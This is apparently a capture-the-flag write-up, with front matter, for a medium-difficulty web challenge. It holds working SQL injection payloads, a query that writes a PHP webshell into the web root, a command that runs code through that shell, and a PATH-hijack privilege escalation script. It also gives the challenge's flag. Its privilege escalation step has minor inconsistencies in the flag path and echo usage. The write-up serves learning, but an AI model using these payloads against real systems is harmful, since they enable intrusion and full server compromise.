---
title: "SQL Injection to RCE"
date: 2024-03-15
event: "PicoCTF 2024"
category: "web"
difficulty: "Medium"
points: 350
solves: 142
flag: "picoCTF{sql_2_rce_ez_mode_a1b2c3}"
description: "Exploiting a blind SQL injection vulnerability to leak credentials, then chaining it with a file write primitive to achieve remote code execution."
tags: [web, sqli, rce]
---

## Overview

The challenge presented a login portal running on MySQL. After initial recon we identified a classic blind SQL injection in the `username` parameter. The real fun started when we found file write privileges enabled via `secure_file_priv`.

## Enumeration

Starting with a basic boolean-based payload to confirm injectable:

```sql
' OR 1=1-- -
```

Response changes confirmed injection. Next, enumerate the database version:

```sql
' AND SUBSTRING(VERSION(),1,1)='5'-- -
```

## Exploitation

With file write confirmed, we dropped a PHP webshell:

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

Then triggered RCE:

```bash
curl "http://target/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

## Privilege Escalation

From there, a quick SUID binary enum:

```bash
find / -perm -4000 2>/dev/null
```

Found a custom binary at `/opt/checker`. Reversed it with `strings` and noticed it called `system("cat /flag")` without a full path — classic PATH hijack.

```bash
export PATH=/tmp:$PATH
echo '#!/bin/bash\ncat /root/flag.txt' > /tmp/cat
chmod +x /tmp/cat
/opt/checker
```

Flag captured.
